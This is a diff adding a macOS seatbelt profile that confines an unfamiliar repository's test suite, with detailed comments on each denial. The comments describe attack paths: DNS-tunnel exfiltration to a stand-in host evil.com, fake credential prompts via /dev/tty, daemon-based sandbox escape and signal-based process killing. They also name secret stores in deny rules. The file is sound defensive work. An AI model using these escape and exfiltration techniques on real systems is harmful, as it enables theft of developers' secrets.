@@ -1,0 +1,185 @@
+;; fence-offline.sb — OS seatbelt for a third-party build/test suite, NO NETWORK.
+;;
+;; This is the profile that runs an unfamiliar repo's own test command. It is a
+;; vendored, STRICTER descendant of ~/.claude/pr-watch/responder.sb, which was
+;; spike-proven on 2026-07-07. Two deliberate divergences from that ancestor:
+;;
+;;   1. NO NETWORK AT ALL. responder.sb grants loopback to an allowlist proxy
+;;      because its child IS `claude` and must reach api.anthropic.com. Our child
+;;      is a test suite: dependencies were installed in a previous, separately
+;;      fenced step, and nothing after that needs a wire. So there is no proxy
+;;      grant here and no PROXYADDR param — a package that behaves during install
+;;      and exfiltrates during `npm test` has nowhere to send anything.
+;;
+;;   2. KEYCHAIN DENIED. responder.sb keeps `mach-lookup` blanket-allowed
+;;      including securityd, reasoning that its jail mounts no keychain so there
+;;      is nothing to read. That reasoning is sound for a claude child. It does
+;;      not transfer: this child is arbitrary third-party code, the user's real
+;;      login keychain exists on this machine, and there is no reason a test
+;;      suite should be able to ask securityd anything. Denied below.
+;;
+;; WHY A SEATBELT AT ALL, when the env is already scrubbed: the 2026-07-07 spike
+;; showed that env-strip + HOME-remap + a Bash denylist LEAKED a sentinel outside
+;; the jail, because anything opening an absolute path ignores $HOME. Env
+;; scrubbing removes credentials the child could have used; only this file stops
+;; it reading them off disk.
+;;
+;; Params (all absolute + canonical — /var is a symlink to /private/var and
+;; sandbox-exec matches the RESOLVED path):
+;;   CLONE  the isolated checkout — the child's whole job (read+write)
+;;   JAIL   the jailed HOME (read+write)
+;;   TMP    the child's scratch dir (read+write)
+;;
+;; NOTE: sandbox-exec is Apple-deprecated but fully functional, and the profile
+;; applies to the whole process tree, so spawned compilers and test runners are
+;; contained too.
+
+(version 1)
+
+;; Apple's own minimal BSD profile. This grants the dyld shared cache on the
+;; Preboot cryptex volume; an enumerated (subpath "/System") does NOT cover the
+;; resolved cryptex path, so a hand-rolled deny-default profile SIGABRTs at boot
+;; (exit 134) without it. bsd.sb grants boot essentials only — it does not open
+;; /Users, so the read fence below still holds.
+(import "bsd.sb")
+(deny default)
+
+(allow process-fork)
+(allow process-exec*)
+;; SCOPED to the sandbox (TERM-188). A bare `(allow signal)` let a fenced child
+;; SIGKILL any process owned by the same user — measured, not theorised: the
+;; probe killed a live process outside the jail and the validator watched it
+;; die. A hostile repo could stop the developer's editor, corrupt a running
+;; build, or take down security tooling, none of which needs a file or a
+;; socket. `same-sandbox` keeps what the fence actually needs — a toolchain
+;; signalling its own children, all of which inherit this sandbox — and the
+;; host-side reaper is unaffected, because it signals INTO the sandbox from
+;; outside and is not bound by this profile.
+(allow signal (target same-sandbox))
+(allow sysctl-read)
+(allow ipc-posix-shm)
+
+;; NOTE: `(allow system-socket)` and `(allow iokit-open)` used to sit here. Both
+;; were removed on 2026-07-21 (TERM-65) after being measured rather than argued
+;; about, because neither was exercised by any test — an unmeasured allow in a
+;; fence whose entire value is measurement.
+;;
+;; What they actually granted, probed with a C program (node cannot open either,
+;; which is why nothing caught this):
+;;   system-socket → socket(PF_SYSTEM, SYSPROTO_CONTROL) SUCCEEDED, and so did
+;;                   PF_ROUTE. Removing it turns both into EPERM.
+;;   iokit-open    → IOServiceOpen(IOSurfaceRoot) SUCCEEDED — a kernel IOKit
+;;                   user client, handed to arbitrary third-party test code.
+;;                   Removing it returns kIOReturnNotPermitted (0xe00002e2).
+;;
+;; On the suspected utun egress path: creating a utun interface failed with
+;; EPERM even UNFENCED, so it is gated by privilege, not by this profile. That
+;; is exactly why the allow had to go rather than be relied upon — the seatbelt
+;; was not what was stopping it, and a run as a more privileged user would have
+;; opened the path with nothing here to close it.
+;;
+;; Verified after removal: node runs, writes its clone, and exits 0 under both
+;; profiles. Neither allow was load-bearing.
+
+;; --- mach services: allow, then subtract the dangerous ones ------------------
+;; Blanket-allow then targeted-deny (last match wins) rather than an enumerated
+;; allowlist: SBPL global-name enumeration is fragile and produces no logged
+;; denials, so it silently boot-rots when a toolchain changes. The subtractions
+;; below are the ones that matter.
+(allow mach-lookup)
+
+;; Keychain. The divergence from responder.sb described in the header.
+(deny mach-lookup
+  (global-name "com.apple.securityd")
+  (global-name "com.apple.SecurityServer")
+  (global-name "com.apple.security.agent")
+  (global-name "com.apple.SecurityAgent"))
+
+;; DNS. mDNSResponder runs OUTSIDE the sandbox, so without this a child could
+;; tunnel data out via getaddrinfo("<base32-payload>.evil.com") even with every
+;; socket denied — the resolver would egress the query on its behalf. An offline
+;; test suite needs no name resolution whatsoever.
+(deny mach-lookup
+  (global-name "com.apple.mDNSResponder")
+  (global-name "com.apple.dnssd")
+  (global-name "com.apple.mDNSResponder.dnsproxy"))
+
+;; Out-of-process NETWORK and PROCESS LAUNCH. Same argument as the DNS block,
+;; and confirmed by probe on 2026-07-21 (TERM-65): under the previous profile
+;; every one of these was REACHABLE via bootstrap_look_up.
+;;
+;;   nsurlsessiond   loads URLs in its own process, outside this sandbox. A
+;;                   reachable URL-loading daemon in a profile whose headline
+;;                   property is (deny network*) is the same class of hole the
+;;                   mDNSResponder deny above exists to close.
+;;   LaunchServices  launches applications via launchd — i.e. a process that is
+;;                   NOT a descendant of this one and NOT inside this sandbox.
+;;                   That is a containment escape, not merely a capability.
+;;   CoreSimulator   spawns simulator processes; nothing a test suite needs.
+;;
+;; The probe only established REACHABILITY; it did not drive any of them into an
+;; actual escape. These are denied on the same reasoning the rest of this file
+;; uses — a claim that CLOSES the gate needs no proof, one that OPENS it does.
+(deny mach-lookup
+  (global-name "com.apple.nsurlsessiond")
+  (global-name "com.apple.nsurlsessiond.NSURLSessionProxy")
+  (global-name "com.apple.lsd.mapdb")
+  (global-name "com.apple.lsd.modifydb")
+  (global-name "com.apple.coreservices.launchservicesd")
+  (global-name "com.apple.CoreSimulator.CoreSimulatorService"))
+
+;; --- network: none ----------------------------------------------------------
+;; Redundant after (deny default), stated explicitly because this is the single
+;; most important property of this file and it should be greppable.
+(deny network*)
+
+;; stat/lstat everywhere. Metadata is not the content secret and build tooling
+;; stats widely; content reads stay governed by file-read* below.
+(allow file-read-metadata)
+
+;; --- system: binaries, dylibs, CA roots, tzdata, locale, toolchains ---------
+(allow file-read*
+  (subpath "/usr")
+  (subpath "/bin")
+  (subpath "/sbin")
+  (subpath "/System")
+  (subpath "/Library")          ;; includes /Library/Developer for Swift toolchains
+  (subpath "/private/etc")
+  (subpath "/private/var/db")
+  (subpath "/private/var/select")
+  (subpath "/opt/homebrew")     ;; node, python, go, rust as installed here
+  (subpath "/Applications/Xcode.app")
+  (literal "/dev/null")
+  (literal "/dev/zero")
+  (literal "/dev/random")
+  (literal "/dev/urandom")
+  (subpath "/dev/fd")
+  (literal "/dev/tty")
+  (literal "/dev/dtracehelper")
+  ;; `literal` grants read-data of the DIRECTORY vnode only, NOT its children, so
+  ;; a tool may list /tmp without opening any sibling process's temp file.
+  (literal "/private/tmp")
+  (literal "/tmp"))
+
+;; Some toolchains need a writable /dev/null and tty for their runners.
+;;
+;; /dev/tty IS a credential-prompt surface, and this grant is not what closes
+;; it. Measured under a real pty on 2026-07-21 (TERM-65): a fenced child with
+;; INHERITED stdio opens /dev/tty and its text lands on the operator's terminal
+;; — enough to imitate a `sudo`/token prompt and read the reply. Spawned with
+;; `detached: true` (setsid, no controlling terminal) the same open fails ENXIO.
+;;
+;; So the containment lives in fence.ts's spawn shape, not in this file, and it
+;; arrived as a side effect of the TERM-63a process-group work. Do not "simplify"
+;; that `detached` flag away: it is load-bearing twice over.
+(allow file-write-data
+  (literal "/dev/null")
+  (literal "/dev/tty"))
+
+;; --- the work: the clone, the jailed HOME, and scratch ----------------------
+;; NOTE what is absent and must stay absent: no ~/.ssh, no ~/.terminalhire, no
+;; ~/.claude, no ~/.gitconfig, no ~/Library/Keychains, no /Users grant of any
+;; kind. There is no granted path from this child to any user secret.
+(allow file* (subpath (param "CLONE")))
+(allow file* (subpath (param "JAIL")))
+(allow file* (subpath (param "TMP")))
